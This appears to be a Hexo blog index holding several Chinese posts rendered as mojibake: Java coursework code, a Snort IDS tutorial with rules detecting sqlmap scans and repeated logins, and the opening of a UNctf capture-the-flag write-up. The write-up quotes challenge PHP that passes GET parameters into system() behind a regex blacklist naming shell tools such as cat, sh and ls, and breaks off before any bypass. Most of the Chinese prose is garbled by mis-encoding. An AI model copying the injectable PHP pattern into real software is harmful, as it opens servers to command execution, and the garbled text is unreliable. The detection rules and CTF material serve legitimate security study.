ä¸Šåˆ10:57:42 * * @description: TODO * * @version: V1.0 * */public class test_8 {    /**     * @param args     * @throws FileNotFoundException      */    public static void main(String[] args) throws FileNotFoundException {        // TODO Auto-generated method stub        try {        Scanner scn = new Scanner(System.in);        System.out.println(&quot;è¯·è¾“å…¥è¦åˆ é™¤æ³¨é‡Šçš„æ–‡ä»¶è·¯å¾„åŠæ–‡ä»¶åï¼š&quot;);        String old_file = scn.next();        FileReader old_one = new FileReader(old_file);        BufferedReader old_cont = new BufferedReader(old_one);        System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶åˆ°çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);        String new_file = scn.next();        FileWriter new_one = new FileWriter(new_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡        BufferedWriter new_one_cont = new BufferedWriter(new_one);//è¯»æ–‡ä»¶        String content = null;        while((content = old_cont.readLine())!=null) {            /**åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨é‡Š             * trim(): å°†è°ƒç”¨è¯¥æ–¹æ³•çš„Stringçš„å‰åç©ºæ ¼åˆ é™¤ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²             * indexOf(): æŸ¥æ‰¾å‚æ•°å­—ç¬¦ä¸²åœ¨è°ƒç”¨æ”¹æ–¹æ³•çš„Stringä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå‚æ•°å­—ç¬¦ä¸²ä¸å­˜åœ¨è¿”å›-1             * &amp; ï¼šä¸è¿ç®—ï¼Œä¸¤è¾¹éƒ½æ˜¯trueæ—¶ç»“æœä¸ºtrue             * | ï¼šæˆ–è¿ç®—ï¼Œä¸¤è¾¹ä»»æ„ä¸€ä¸ªä¸ºtrueï¼Œç»“æœä¸ºtrueï¼Œéƒ½ä¸æ˜¯trueï¼Œç»“æœä¸ºfalse             */            if((content.trim().indexOf(&quot;//&quot;)==-1)&amp;(content.trim().indexOf(&quot;/*&quot;)==-1)&amp;(content.trim().indexOf(&quot;*/&quot;)==-1)) {                System.out.println(content);                new_one_cont.write(content);                new_one_cont.newLine();            }                //System.out.print(content+&quot;\n&quot;);        }        //å…³é—­æ–‡ä»¶        new_one_cont.flush();        new_one_cont.close();        new_one.close();    } catch (IOException e) {            // TODO Auto-generated catch block        e.printStackTrace();    }}}</code></pre></li></ul><h2 id="six-chapter"><a href="#six-chapter" class="headerlink" title="six_chapter"></a>six_chapter</h2><ul><li><p>å¤šçº¿ç¨‹æ‰“å°çº¿ç¨‹å·</p><pre><code>package sixth_chapter;/** * @author brian * * @date: 2019å¹´12æœˆ1æ—¥ ä¸‹åˆ7:50:35 * * @description: TODO * * @version: V1.0 * */public class SecondThread implements Runnable{    /**     * @param args     */    public void run() {        for(int i=0;i&lt;5;i++) {            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+(char)(i+&apos;A&apos;));            try {                Thread.sleep(700);            }            catch(InterruptedException e) {                e.printStackTrace();            }        }    }    public static void main(String[] args) {        // TODO Auto-generated method stub    }}</code></pre></li></ul><pre><code>package sixth_chapter;//import FitstThread;//import SecondThread;/** * @author brian * * @date: 2019å¹´12æœˆ1æ—¥ ä¸‹åˆ7:19:12 * * @description: TODO * * @version: V1.0 * */public class test_4 {    /**     * @param args     */    public static void main(String[] args) {        // TODO Auto-generated method stub        Runnable target = new SecondThread();        Thread t1 = new Thread(target);        Thread t2 = new Thread(target);        for(int i=0;i&lt;10;i++) {            System.out.println(Thread.currentThread().getName()+&quot;: &quot;+i);            try {                Thread.sleep(700);            }            catch(InterruptedException e) {                e.printStackTrace();            }            if(i==1) t1.start();            if(i==2) t2.start();        }    }}</code></pre><ul><li>çº¿ç¨‹äº’æ–¥</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java&#39;s things </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>snort å®‰å…¨é˜²å¾¡</title>
      <link href="/2019/11/24/snort-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1/"/>
      <url>/2019/11/24/snort-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="å®‰å…¨é˜²å¾¡-snort"><a href="#å®‰å…¨é˜²å¾¡-snort" class="headerlink" title="å®‰å…¨é˜²å¾¡-snort"></a>å®‰å…¨é˜²å¾¡-snort</h1><p>Snort IDSï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç½‘ç»œå…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚å®ƒå…·æœ‰å®æ—¶æ•°æ®æµé‡åˆ†æå’Œè®°å½•IPç½‘ç»œæ•°æ®åŒ…çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿè¿›è¡Œåè®®åˆ†æï¼Œå¯¹ç½‘ç»œæ•°æ®åŒ…å†…å®¹è¿›è¡Œæœç´¢/åŒ¹é…ã€‚å®ƒèƒ½å¤Ÿæ£€æµ‹å„ç§ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼Œå¯¹æ”»å‡»è¿›è¡Œå®æ—¶æŠ¥è­¦ã€‚æ­¤å¤–ï¼ŒSnortæ˜¯å¼€æºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå¹¶å…·æœ‰å¾ˆå¥½çš„æ‰©å±•æ€§å’Œå¯ç§»æ¤æ€§ã€‚</p><h2 id="Snort-ç®€ä»‹"><a href="#Snort-ç®€ä»‹" class="headerlink" title="Snort ç®€ä»‹"></a>Snort ç®€ä»‹</h2><h3 id="snortä½“ç³»ç»“æ„"><a href="#snortä½“ç³»ç»“æ„" class="headerlink" title="snortä½“ç³»ç»“æ„"></a>snortä½“ç³»ç»“æ„</h3><p>Snortçš„ç»“æ„ç”±4å¤§è½¯ä»¶æ¨¡å—ç»„æˆï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼š</p><ol><li>æ•°æ®åŒ…å—…æ¢æ¨¡å—â€”â€”è´Ÿè´£ç›‘å¬ç½‘ç»œæ•°æ®åŒ…ï¼Œå¯¹ç½‘ç»œè¿›è¡Œåˆ†ï¼›</li><li>é¢„å¤„ç†æ¨¡å—â€”â€”è¯¥æ¨¡å—ç”¨ç›¸åº”çš„æ’ä»¶æ¥æ£€æŸ¥åŸå§‹æ•°æ®åŒ…ï¼Œä»ä¸­å‘ç°åŸå§‹æ•°æ®çš„â€œè¡Œä¸ºâ€ï¼Œå¦‚ç«¯å£æ‰«æï¼ŒIPç¢ç‰‡ç­‰ï¼Œæ•°æ®åŒ…ç»è¿‡é¢„å¤„ç†åæ‰ä¼ åˆ°æ£€æµ‹å¼•æ“ï¼›</li><li>æ£€æµ‹æ¨¡å—â€”â€”è¯¥æ¨¡å—æ˜¯Snortçš„æ ¸å¿ƒæ¨¡å—ã€‚å½“æ•°æ®åŒ…ä»é¢„å¤„ç†å™¨é€è¿‡æ¥åï¼Œæ£€æµ‹å¼•æ“ä¾æ®é¢„å…ˆè®¾ç½®çš„è§„åˆ™æ£€æŸ¥æ•°æ®åŒ…ï¼Œä¸€æ—¦å‘ç°æ•°æ®åŒ…ä¸­çš„å†…å®¹å’ŒæŸæ¡è§„åˆ™ç›¸åŒ¹é…ï¼Œå°±é€šçŸ¥æŠ¥è­¦æ¨¡å—ï¼›</li><li>æŠ¥è­¦/æ—¥å¿—æ¨¡å—â€”â€”ç»æ£€æµ‹å¼•æ“æ£€æŸ¥åçš„Snortæ•°æ®éœ€è¦ä»¥æŸç§æ–¹å¼è¾“å‡ºã€‚å¦‚æœæ£€æµ‹å¼•æ“ä¸­çš„æŸæ¡è§„åˆ™è¢«åŒ¹é…ï¼Œåˆ™ä¼šè§¦å‘ä¸€æ¡æŠ¥è­¦ï¼Œè¿™æ¡æŠ¥è­¦ä¿¡æ¯ä¼šé€šè¿‡ç½‘ç»œã€UNIXsocketã€WindowsPopu(SMB)ã€SNMPåè®®çš„trapå‘½ä»¤ä¼ é€ç»™æ—¥å¿—æ–‡ä»¶ï¼Œç”šè‡³å¯ä»¥å°†æŠ¥è­¦ä¼ é€ç»™ç¬¬ä¸‰æ–¹æ’ä»¶ï¼ˆå¦‚SnortSamï¼‰ï¼Œå¦å¤–æŠ¥è­¦ä¿¡æ¯ä¹Ÿå¯ä»¥è®°å…¥SQLæ•°æ®åº“ã€‚</li></ol><h3 id="snortä¸‰ç§å·¥ä½œæ–¹å¼"><a href="#snortä¸‰ç§å·¥ä½œæ–¹å¼" class="headerlink" title="snortä¸‰ç§å·¥ä½œæ–¹å¼"></a>snortä¸‰ç§å·¥ä½œæ–¹å¼</h3><p>Snortæ‹¥æœ‰ä¸‰å¤§åŸºæœ¬åŠŸèƒ½ï¼šå—…æ¢å™¨ã€æ•°æ®åŒ…è®°å½•å™¨å’Œå…¥ä¾µæ£€æµ‹ã€‚</p><ol><li>å—…æ¢å™¨æ¨¡å¼ä»…ä»ç½‘ç»œä¸Šè¯»å–æ•°æ®åŒ…å¹¶ä½œä¸ºè¿ç»­ä¸æ–­çš„æµæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šï¼Œå¸¸ç”¨å‘½ä»¤snort -vã€‚ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å°†ä½¿snortåªè¾“å‡ºIP/TCP/UDP/ICMPçš„åŒ…å¤´ä¿¡æ¯</li><li>æ•°æ®åŒ…è®°å½•å™¨æ¨¡å¼æ˜¯æŠŠæ•°æ®åŒ…è®°å½•åˆ°ç¡¬ç›˜ä¸Šï¼Œå¸¸ç”¨å‘½ä»¤snort â€“l æŒ‡å®šä¸€ä¸ªç›®å½•ã€‚è¿™ä¼šå°†æ‰€æœ‰çš„åŒ…è®°å½•åˆ°ç¡¬ç›˜ä¸Šã€‚</li><li>ç½‘ç»œå…¥ä¾µæ£€æµ‹æ¨¡å¼æ˜¯æœ€å¤æ‚çš„ï¼Œè€Œä¸”æ˜¯å¯é…ç½®çš„ã€‚æˆ‘ä»¬å¯ä»¥è®©Snortåˆ†æç½‘ç»œæ•°æ®æµä»¥åŒ¹é…ç”¨æˆ·å®šä¹‰çš„ä¸€äº›è§„åˆ™ï¼Œå¹¶æ ¹æ®æ£€æµ‹ç»“æœé‡‡å–ä¸€å®šçš„åŠ¨ä½œã€‚</li></ol><h2 id="å¦‚ä½•ä½¿ç”¨0x01"><a href="#å¦‚ä½•ä½¿ç”¨0x01" class="headerlink" title="å¦‚ä½•ä½¿ç”¨0x01"></a>å¦‚ä½•ä½¿ç”¨0x01</h2><h3 id="snort-è§„åˆ™å®šä¹‰"><a href="#snort-è§„åˆ™å®šä¹‰" class="headerlink" title="snort è§„åˆ™å®šä¹‰"></a>snort è§„åˆ™å®šä¹‰</h3><p>Snortä½¿ç”¨ä¸€ç§ç®€å•çš„è§„åˆ™æè¿°è¯­è¨€ï¼Œè¿™ç§æè¿°è¯­è¨€æ˜“äºæ‰©å±•ï¼ŒåŠŸèƒ½ä¹Ÿæ¯”è¾ƒå¼ºå¤§ã€‚<br>Snortè§„åˆ™æ˜¯åŸºäºæ–‡æœ¬çš„ï¼Œè§„åˆ™æ–‡ä»¶æŒ‰ç…§ä¸åŒçš„ç»„è¿›è¡Œåˆ†ç±»ï¼Œæ¯”å¦‚ï¼Œæ–‡ä»¶<code>ftp.rules</code>åŒ…å«äº†FTPæ”»å‡»å†…å®¹ã€‚<br>ã€Œæ³¨ã€Snortçš„æ¯æ¡è§„åˆ™å¿…é¡»åœ¨ä¸€è¡Œä¸­ï¼Œå®ƒçš„è§„åˆ™è§£é‡Šå™¨æ— æ³•å¯¹è·¨è¡Œçš„è§„åˆ™è¿›è¡Œè§£æã€‚Snortçš„æ¯æ¡è§„åˆ™éƒ½å¯ä»¥åˆ†æˆé€»è¾‘ä¸Šçš„ä¸¤ä¸ªéƒ¨åˆ†ï¼š<strong>è§„åˆ™å¤´å’Œè§„åˆ™ä½“</strong>ã€‚</p><p>è§„åˆ™å¤´åŒ…æ‹¬4ä¸ªéƒ¨åˆ†ï¼š<strong>è§„åˆ™è¡Œä¸ºï¼›åè®®ï¼›æºä¿¡æ¯ï¼›ç›®çš„ä¿¡æ¯</strong>ã€‚</p><p>snortè§„åˆ™å¤´Snorté¢„ç½®çš„è§„åˆ™åŠ¨ä½œæœ‰5ç§ï¼š</p><ol><li>passâ€”åŠ¨ä½œé€‰é¡¹passå°†å¿½ç•¥å½“å‰çš„åŒ…ï¼Œåç»§æ•è·çš„åŒ…å°†è¢«ç»§ç»­åˆ†æã€‚</li><li>logâ€”åŠ¨ä½œé€‰é¡¹logå°†æŒ‰ç…§è‡ªå·±é…ç½®çš„æ ¼å¼è®°å½•åŒ…ã€‚</li><li>alertâ€”åŠ¨ä½œé€‰é¡¹alertå°†æŒ‰ç…§è‡ªå·±é…ç½®çš„æ ¼å¼è®°å½•åŒ…ï¼Œç„¶åè¿›è¡ŒæŠ¥è­¦ã€‚å®ƒçš„åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯å¿…é¡»æ°å½“çš„ç”¨ï¼Œå› ä¸ºå¦‚æœæŠ¥è­¦è®°å½•è¿‡å¤šï¼Œä»ä¸­æ”«å–æœ‰æ•ˆä¿¡æ¯çš„å·¥ä½œé‡å¢å¤§ï¼Œåè€Œä¼šä½¿å®‰å…¨é˜²æŠ¤å·¥ä½œå˜å¾—ä½æ•ˆã€‚</li><li>dynamicâ€”åŠ¨ä½œé€‰é¡¹dynamicæ˜¯æ¯”è¾ƒç‹¬ç‰¹çš„ä¸€ç§ï¼Œå®ƒä¿æŒåœ¨ä¸€ç§æ½œä¼çŠ¶æ€ï¼Œç›´åˆ°activateç±»å‹çš„è§„åˆ™å°†å…¶è§¦å‘ï¼Œä¹‹åå®ƒå°†åƒlogåŠ¨ä½œä¸€æ ·è®°å½•æ•°æ®åŒ…ã€‚</li><li>activateâ€”åŠ¨ä½œé€‰é¡¹activateåŠŸèƒ½å¼ºå¤§ï¼Œå½“è¢«è§„åˆ™è§¦å‘æ—¶ç”ŸæˆæŠ¥è­¦ï¼Œå¹¶å¯åŠ¨ç›¸å…³çš„dynamicç±»å‹è§„åˆ™ã€‚åœ¨æ£€æµ‹å¤æ‚çš„æ”»å‡»ï¼Œæˆ–å¯¹æ•°æ®è¿›è¡Œå½’ç±»æ—¶ï¼Œè¯¥åŠ¨ä½œé€‰é¡¹ç›¸å½“æœ‰ç”¨ã€‚é™¤äº†ä»¥ä¸Š5ç§é¢„ç½®çš„è§„åˆ™åŠ¨ä½œç±»å‹ï¼Œç”¨æˆ·è¿˜å¯ä»¥å®šåˆ¶è‡ªå·±çš„ç±»å‹ã€‚</li></ol><p>è§„åˆ™ä½“çš„ä½œç”¨æ˜¯åœ¨è§„åˆ™å¤´ä¿¡æ¯çš„åŸºç¡€ä¸Šè¿›ä¸€æ­¥åˆ†æï¼Œæœ‰äº†å®ƒæ‰èƒ½ç¡®è®¤å¤æ‚çš„æ”»å‡»(Snortçš„è§„åˆ™å®šä¹‰ä¸­å¯ä»¥æ²¡æœ‰è§„åˆ™ä½“)ã€‚è§„åˆ™ä½“ç”±è‹¥å¹²ä¸ªè¢«åˆ†åˆ«éš”å¼€çš„ç‰‡æ–­ç»„æˆï¼Œæ¯ä¸ªç‰‡æ–­å®šä¹‰äº†ä¸€ä¸ªé€‰é¡¹å’Œç›¸åº”çš„é€‰é¡¹å€¼ã€‚ä¸€éƒ¨åˆ†é€‰é¡¹æ˜¯å¯¹å„ç§åè®®çš„è¯¦ç»†è¯´æ˜ï¼ŒåŒ…æ‹¬IPã€ICMPå’ŒTCPåè®®ï¼Œå…¶ä½™çš„é€‰é¡¹æ˜¯ï¼šè§„åˆ™è§¦å‘æ—¶æä¾›ç»™ç®¡ç†å‘˜çš„å‚è€ƒä¿¡æ¯ï¼Œè¢«æœç´¢çš„å…³é”®å­—ï¼ŒSnortè§„åˆ™çš„æ ‡è¯†å’Œå¤§å°å†™ä¸æ•æ„Ÿé€‰é¡¹ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªè§„åˆ™å®ä¾‹ã€‚</p><pre><code>alert tcp !192.168.43.0/24 any -&gt;any 21 (content:&quot;USER&quot;;msg: &quot;FTP Login&quot;;)</code></pre><ol><li><code>alert</code>è¡¨ç¤ºè§„åˆ™åŠ¨ä½œä¸ºæŠ¥è­¦ã€‚                                         </li><li><code>tcp</code>è¡¨ç¤ºåè®®ç±»å‹ä¸ºTCPåè®®ã€‚ </li><li><code>!192.168.0.1/24</code>è¡¨ç¤ºæºIPåœ°å€ä¸æ˜¯192.168.0.1/24ã€‚ </li><li>ç¬¬ä¸€ä¸ª<code>any</code>è¡¨ç¤ºæºç«¯å£ä¸ºä»»æ„ç«¯å£ã€‚                            </li><li><code>-&gt;</code>è¡¨ç¤ºå‘é€æ–¹å‘æ“ä½œç¬¦ï¼Œæ–¹å‘æ“ä½œç¬¦å·¦è¾¹çš„ipåœ°å€å’Œç«¯å£å·è¢«è®¤ä¸ºæ˜¯æµæ¥è‡ªçš„æºä¸»æœº</li><li>ç¬¬äºŒä¸ªanyè¡¨ç¤ºç›®çš„IPåœ°å€ä¸ºä»»æ„IPåœ°å€ã€‚</li><li>21è¡¨ç¤ºç›®çš„ç«¯å£ä¸º21ã€‚ </li><li><code>content:&quot;USER&quot;</code>è¡¨ç¤ºåŒ¹é…çš„å­—ç¬¦ä¸²ä¸ºâ€œUSERâ€ã€‚      </li><li><code>msg:&quot;FTPLogin&quot;</code>è¡¨ç¤ºæŠ¥è­¦ä¿¡æ¯ä¸ºâ€œFTPLoginâ€</li></ol><p>é¢„å¤„ç†å™¨åœ¨è°ƒç”¨æ£€æµ‹å¼•æ“ä¹‹å‰ï¼Œåœ¨æ•°æ®åŒ…è¢«è§£ç ä¹‹åè¿è¡Œã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼ŒSnortå¯ä»¥ä»¥ä¸€ç§<code>out of band</code>çš„æ–¹å¼å¯¹æ•°æ®åŒ…è¿›è¡Œä¿®æ”¹æˆ–è€…åˆ†æã€‚<br>é¢„å¤„ç†å™¨å¯ä»¥ä½¿ç”¨<code>preprocessor</code>å…³é”®è¯æ¥åŠ è½½å’Œé…ç½®ï¼Œå¸¸ç”¨åˆ°çš„é¢„å¤„ç†å™¨å¦‚ä¸‹:</p><ol><li><code>HTTPdecode</code>é¢„å¤„å™¨HTTPè§£ç é¢„å¤„ç†æ¨¡å—ç”¨æ¥å¤„ç†HTTPURLå­—ç¬¦ä¸²ï¼ŒæŠŠå®ƒä»¬è½¬æ¢ä¸ºæ¸…æ™°çš„ASCIIå­—ç¬¦ä¸²ã€‚</li><li>ç«¯å£æ‰«æå™¨<code>portscan</code>ç«¯å£æ‰«æå™¨ä¼šæŠŠç”±å•ä¸ªæºIPåœ°å€å‘èµ·çš„ç«¯å£æ‰«æä»å¼€å§‹åˆ°ç»“æŸçš„å…¨è¿‡ç¨‹è®°å½•åˆ°æ ‡å‡†æ—¥å¿—ã€‚</li><li><code>stream</code>å¤„ç†å™¨streamå¤„ç†å™¨ä¸ºsnortæä¾›äº†TCPæ•°æ®åŒ…é‡ç»„çš„åŠŸèƒ½ã€‚åœ¨é…ç½®çš„ç«¯å£ä¸Šï¼Œstreamå¤„ç†å™¨èƒ½å¤Ÿå¯¹TCPæ•°æ®åŒ…çš„ç»†å°ç‰‡æ®µè¿›è¡Œé‡ç»„ï¼Œä½¿ä¹‹æˆä¸ºå®Œæ•´çš„TCPæ•°æ®åŒ…ï¼Œç„¶åsnortå¯ä»¥å¯¹å…¶å¯ç–‘è¡Œä¸ºè¿›è¡Œæ£€æŸ¥ã€‚</li><li><code>frag2</code>å¤„ç†å™¨frag2é¢„å¤„ç†å™¨ä¸ºsnortæä¾›äº†IPåˆ†ç‰‡é‡ç»„çš„åŠŸèƒ½ã€‚frag2é¢„å¤„ç†å™¨èƒ½å¤Ÿå¯¹åˆ†ç‰‡åŒ…è¿›è¡Œé‡ç»„æ¥å®šä½åˆ†ç‰‡æ”»å‡»ï¼Œå®ƒçš„å·¥ä½œåŸç†æ˜¯å°†æ‰€æœ‰çš„åˆ†ç‰‡é‡ç»„æ„é€ æˆä¸€ä¸ªåŒ…å«å®Œæ•´ä¿¡æ¯çš„æ•°æ®åŒ…ï¼Œå†å°†è¿™ä¸ªåŒ…ä¼ ç»™æ£€æµ‹å¼•æ“ã€‚</li></ol><h3 id="ç¼–å†™è§„åˆ™"><a href="#ç¼–å†™è§„åˆ™" class="headerlink" title="ç¼–å†™è§„åˆ™"></a>ç¼–å†™è§„åˆ™</h3><p>æˆ‘ä»¬åœ¨ä½¿ç”¨å¼€å§‹å‰ä¸€å®šè¦æ³¨æ„é€‰æ‹©å¥½ç½‘å¡ï¼Œåœ¨snort.exeæ–‡ä»¶æ‰€åœ¨ç›®å½•ç”¨<code>snort -W</code>æŸ¥çœ‹ç³»ç»Ÿå¯ç”¨ç½‘ç»œæ¥å£ã€‚è®°ä½éœ€è¦ç›‘è§†çš„ç½‘å¡çš„ç¼–å·ï¼Œæ¯”å¦‚ä¸º2ï¼Œé‚£ä¹ˆåœ¨ä»¥åçš„ä½¿ç”¨ä¸­ï¼Œç”¨<code>-i 2</code>å°±å¯ä»¥é€‰æ‹©å¯¹åº”çš„ç½‘å¡ã€‚</p><p>æˆ‘ä»¬å…ˆæ–°å»ºè§„åˆ™</p><pre><code>alert icmp any any -&gt; 192.168.43.137 any (msg:ï¼‚ICMP PINGï¼‚;sid:10000)</code></pre><p>ipåœ°å€æ˜¯æˆ‘çš„ä¸»æœºipã€‚è¿™æ¡è§„åˆ™çš„æ„æ€å°±æ˜¯ å¯¹æ¥è‡ªä»»ä½•åœ°å€çš„<code>icmp</code>æ•°æ®åŒ…å‘å‡ºè­¦å‘Šä¿¡æ¯.</p><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><pre><code>snort -i 2 -c ../etc/snort.conf -l ./log</code></pre><p>æˆ‘ä»¬å°†ç¼–å†™çš„è§„åˆ™å†™å…¥<code>snort.conf</code>ä¸­ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦ <code>-c</code> æ¥æŒ‡å®šæˆ‘ä»¬ç”¨çš„è§„åˆ™ï¼Œå¹¶å°†æ—¥å¿—è®°å½•åˆ° log æ–‡ä»¶åŠ ä¸­ã€‚</p><p>æ—¥å¿—æ˜¯äºŒè¿›åˆ¶ä¿å­˜çš„ï¼Œå¯¹äºæŸ¥çœ‹æ—¥å¿—æ–‡ä»¶æˆ‘ä»¬éœ€è¦æ‰§è¡Œ</p><pre><code>snort -dvr snort.log.xxxx</code></pre><h2 id="å¦‚ä½•ä½¿ç”¨0x02"><a href="#å¦‚ä½•ä½¿ç”¨0x02" class="headerlink" title="å¦‚ä½•ä½¿ç”¨0x02"></a>å¦‚ä½•ä½¿ç”¨0x02</h2><h3 id="ä½¿ç”¨-snort-æ£€æµ‹å±€åŸŸç½‘å†…-sqlmap-è¡Œä¸º"><a href="#ä½¿ç”¨-snort-æ£€æµ‹å±€åŸŸç½‘å†…-sqlmap-è¡Œä¸º" class="headerlink" title="ä½¿ç”¨ snort æ£€æµ‹å±€åŸŸç½‘å†… sqlmap è¡Œä¸º"></a>ä½¿ç”¨ snort æ£€æµ‹å±€åŸŸç½‘å†… sqlmap è¡Œä¸º</h3><p>å…ˆç¼–å†™è§„åˆ™</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;sqlmap&quot;;sid=10000;classtype:webscan;rev=1)</code></pre><p>åœ¨ <code>classification.conf</code> ä¸­æ·»åŠ  webscan ç±»å‹çš„è§„åˆ™</p><pre><code>config classfiction æè¿°ï¼Œæè¿°ï¼Œå±é™©ç­‰çº§config classification:shortname,short description,priorityconfig classification: webscan,webscan sqlmap,1</code></pre><p>åœ¨ <code>sid-msg.map</code> ä¸­æ·»åŠ é¢„å®šä¹‰æè¿°</p><pre><code>10000 || webscan sqlmap detected || mcafee,98775</code></pre><p>æœ¬åœ°èµ· dvwa ä¹‹åä½¿ç”¨ low çº§åˆ«çš„ sqlæ³¨å…¥ ï¼Œå°†payloadæ”¾å…¥sqlmapï¼Œéšåæ‰“å¼€snortè¿›è¡Œç›‘å¬å‘ç°äº†sqlmapè¡Œä¸ºã€‚</p><p>ä½†æ˜¯è¿™é‡Œå­˜åœ¨é—®é¢˜ï¼Œsnort åœ¨UAå¤´é‡Œæ£€æµ‹åˆ°äº† sqlmap å­—ç¬¦ä¸²ï¼Œç„¶åæ‰“å°äº†è­¦å‘Šä¿¡æ¯ï¼Œè¿™æ ·çš„æ£€æµ‹ä¸å¤Ÿä¸¥è°¨ï¼Œå› ä¸ºæˆ‘ä»¬å¦‚æœåœ¨ sql æ³¨å…¥çš„åœ°æ–¹å¡«å…¥sqlmapå®ƒåŒæ ·ä¼šè§¦å‘ snort è­¦å‘Šã€‚</p><p>æˆ‘ä»¬ä¿®æ”¹åŸæ¥çš„è§„åˆ™ä¸º</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;User-Agent: sqlmap/&quot;;sid=10000;classtype:webscan;rev=2)</code></pre><p>æ­¤æ—¶æˆ‘ä»¬å°±èƒ½é’ˆå¯¹ UA å¤´è¿›è¡Œç›‘æµ‹(revä¹ŸåŠ ä¸€ï¼Œè·Ÿä¹‹å‰çš„è®°å½•è¿›è¡ŒåŒºåˆ†)ã€‚</p><p>ä½†æ˜¯ sqlmap å…¶å®å¯ä»¥ç»•è¿‡ UA å¤´çš„æ£€æµ‹ï¼Œæˆ‘ä»¬åœ¨ sqlmap ä¸­æ·»åŠ  <code>random-agent</code> å‚æ•°ï¼Œå°±å¯ä»¥ä½¿ç”¨ä¸åŒçš„ UA ã€‚</p><p>å¦å¤–ï¼Œåœ¨ä½¿ç”¨è§„åˆ™æ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ·»åŠ å¤šä¸ª content æ¥è¿›è¡Œæ£€æµ‹ï¼š</p><pre><code>alert any any -&gt; any any (msg:&quot;webscan sqlmap&quot;;content:&quot;and&quot;;content:&quot;=&quot;;sid=10001;classtype:webscan;rev=2)</code></pre><p>è¿™æ ·åœ¨åŒ¹é…åˆ°ä¸¤ä¸ªå…³é”®è¯æ—¶å°±ä¼šè§¦å‘è­¦å‘Šã€‚</p><p>å¯¹äºå…¶ä»–çš„æ”»å‡»ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®æ—¥å¿—æ¥æŠ“å–ä¸åŒçš„è¯·æ±‚ï¼Œç„¶åæ·»åŠ åˆ°å¯¹åº”çš„è§„åˆ™é‡Œã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ¶å®šä¸€ä¸ªä¾æ®è®¿é—®é¢‘ç‡çš„è§„åˆ™ï¼š</p><pre><code>alert any any -&gt; any any (msg:&quot;too many access&quot;;content:&quot;192.168.10.132/login.php&quot;;detection_filter:count 3, second 300,track by_src;sid=10002;classtype:webscan;rev=1)</code></pre><p>è¿™æ ·5åˆ†é’Ÿå†…å‘å‡ºä¸‰æ¬¡è¯·æ±‚å°±ä¼šè¢«æ£€æµ‹åˆ°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNctf èµ›åå›é¡¾</title>
      <link href="/2019/11/20/unctf/"/>
      <url>/2019/11/20/unctf/</url>
      
        <content type="html"><![CDATA[<h1 id="UNctf-èµ›åå›é¡¾"><a href="#UNctf-èµ›åå›é¡¾" class="headerlink" title="UNctf èµ›åå›é¡¾"></a>UNctf èµ›åå›é¡¾</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>é¢˜ç›®æºç ï¼š</p><pre><code>&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    if (preg_match(&quot;/\&apos;|\&quot;|,|;|\\|\`|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))        $a = &quot;&quot;;        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;    if (preg_match(&quot;/\&apos;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))        $b = &quot;&quot;;        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;     $cmd = &quot;file $a $b&quot;;      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;);      system($cmd);?&gt;</code></pre><h3 id="one-way"><a href="#one-way" class="headerlink" title="one way"></a>one way</h3><p>æ­£åˆ™é»‘åå•åŒ¹é…ï¼Œå¯¹è¾“å…¥çš„å‚æ•°å¼ºåˆ¶åŠ ä¸ŠåŒå¼•å·ï¼Œå³ä½¿æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ä¹Ÿä¼šè¢«åŠ ä¸ŠåŒå¼•å·æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œç”¨åˆ°äº†åå¼•å· ```</p><p>è§‚å¯Ÿç¬¬ä¸€ä¸ªæ­£åˆ™ `\|`` 